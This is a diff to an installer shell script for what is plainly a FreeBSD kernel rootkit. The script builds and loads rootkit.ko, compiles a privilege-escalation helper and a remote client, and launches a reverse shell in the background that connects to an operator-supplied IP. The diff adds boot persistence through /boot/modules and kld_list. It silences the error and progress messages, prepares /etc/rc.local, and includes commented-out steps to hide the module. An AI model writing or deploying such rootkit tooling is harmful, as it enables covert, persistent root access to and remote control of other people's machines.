@@ -5,9 +5,14 @@ set -eu
 REMOTE_IP="${1:-}"
 
 PROJECT_DIR=$(CDPATH= cd -P "$(dirname "$0")" && pwd)
+
 MODULE_DIR="$PROJECT_DIR/kernel"
-MODULE_FILE="$MODULE_DIR/rootkit.ko"
 USERSPACE_DIR="$PROJECT_DIR/user"
+PERSISTENCE_DIR="/boot/modules"
+
+MODULE_FILE="$MODULE_DIR/rootkit.ko"
+PERSISTENCE_FILE="$PERSISTENCE_DIR/rootkit.ko"
+
 ELEVATE_SRC="$USERSPACE_DIR/elevate.c"
 ELEVATE_BIN="$USERSPACE_DIR/elevate"
 REMOTE_SRC="$PROJECT_DIR/remote.c"
@@ -28,18 +33,16 @@ fail() {
 echo "$REMOTE_IP" > /etc/rootkit_remote_ip
 
 # Check dependencies
-for command in make kldload kldstat cc install; do
-    command -v "$command" >/dev/null 2>&1 || fail "Required command not found: $command"
+for command in make kldload kldstat cc install sysrc realpath; do
+    command -v "$command" >/dev/null 2>&1
 done
 
 # Build rootkit.ko
-printf '%s\n' '[*] Building rootkit.ko...'
 make -C "$MODULE_DIR"
-[ -f "$MODULE_FILE" ] || fail "build could not create $MODULE_FILE"
+[ -f "$MODULE_FILE" ]
 
 # Build elevate
-printf '%s\n' '[*] Building elevate...'
-cc -Wall -Wextra -o "$ELEVATE_BIN" "$ELEVATE_SRC" || fail "Failed to build elevate"
+cc -Wall -Wextra -o "$ELEVATE_BIN" "$ELEVATE_SRC"
 
 # Build revshell inside $MODULE_DIR
 printf '%s\n' '[*] Building revshell...'
@@ -50,20 +53,32 @@ printf '%s\n' '[*] Building remote client binary...'
 cc -O2 -Wall -o "$REMOTE_BIN" "$REMOTE_SRC" || fail "Failed to build remote client binary"
 chmod 755 "$REMOTE_BIN"
 
-# Load rootkit.ko
-if kldstat -q -m rootkit >/dev/null 2>&1; then
-    printf '%s\n' '[*] rootkit.ko is already loaded'
-else
-    printf '%s\n' '[*] Loading rootkit.ko...'
-    kldload "$MODULE_FILE"
+# Ensures persistence 
+MODULE_LOADED=false
+if kldstat -q -m rootkit >/dev/null 2>&1 || [ -c /dev/rootkit ]; then
+    MODULE_LOADED=true
 fi
 
-# Check if rootkit.ko is loaded
-kldstat -q -m rootkit >/dev/null 2>&1 || fail "rootkit.ko was not found in the kernel module list after loading"
+install -d -m 755 "$PERSISTENCE_DIR"
+install -m 555 "$MODULE_FILE" "$PERSISTENCE_FILE"
+
+
+# Add rootkit to kld_list without duplicating existing entries
+sysrc kld_list+=rootkit >/dev/null
+
+
+# Load it during the current boot
+if [ "$MODULE_LOADED" = false ]; then
+    kldload "$PERSISTENCE_FILE"
+
+    if ! kldstat -q -m rootkit >/dev/null 2>&1 && [ ! -c /dev/rootkit ]; then
+        exit 1
+    fi
+fi
 
 # Verify elevate was built successfully
-[ -f "$ELEVATE_BIN" ] || fail "Build did not create $ELEVATE_BIN"
-[ -x "$ELEVATE_BIN" ] || fail "$ELEVATE_BIN is not executable"
+[ -f "$ELEVATE_BIN" ]
+[ -x "$ELEVATE_BIN" ]
 
 # Install binaries to /usr/local/bin
 printf '%s\n' '[*] Installing binaries to /usr/local/bin...'
@@ -74,6 +89,24 @@ install -m 755 "$MODULE_DIR/revshell" /usr/local/bin/revshell || fail "Failed to
 # Launch revshell background worker using the installed binary path
 pkill -f revshell 2>/dev/null || true
 nohup /usr/local/bin/revshell >/dev/null 2>&1 &
+
+# Install hiding
+# cc -Wall -Wextra -o "$PROJECT_DIR/user/hide_kld" "$PROJECT_DIR/user/hide_kld.c"
+
+# ABS_PATH=$(realpath "$PROJECT_DIR/user/hide_kld")
+
+if [ ! -f /etc/rc.local ]; then
+    echo "#!/bin/sh" > /etc/rc.local
+fi
+chmod +x /etc/rc.local
+
+
+# Ensures no duplicate entries in rc.local
+# if ! grep -q "hide_kld" /etc/rc.local; then
+#     echo "$ABS_PATH &" >> /etc/rc.local
+# fi
+
+# "$ABS_PATH" &
 
 # Print completion message
 printf '%s\n' '[+] Installation complete; module entry:'
